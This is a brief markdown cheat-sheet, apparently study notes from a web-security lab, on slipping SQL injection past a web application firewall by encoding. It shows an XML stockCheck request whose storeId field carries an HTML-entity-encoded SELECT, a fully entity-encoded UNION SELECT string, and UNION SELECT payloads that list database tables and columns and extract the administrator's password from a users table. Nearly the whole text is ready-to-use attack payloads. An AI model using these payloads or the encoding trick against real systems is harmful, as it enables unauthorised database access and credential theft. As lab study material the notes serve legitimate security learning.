# Encoding

Other formats that otherwise WAF would block. Will be decoded in server-side before being passed to the SQL interpreter.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## ASCII encode

`UNION SELECT table_name FROM information_schema.tables`

`&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#116;&#97;&#98;&#108;&#101;&#95;&#110;&#97;&#109;&#101;&#32;&#70;&#82;&#79;&#77;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#95;&#115;&#99;&#104;&#101;&#109;&#97;&#46;&#116;&#97;&#98;&#108;&#101;&#115;`

### Same for others on ASCII

`UNION SELECT username FROM information_schema.columns WHERE table_name='users'`

`UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'`

`UNION SELECT password from users where username='administrator'`
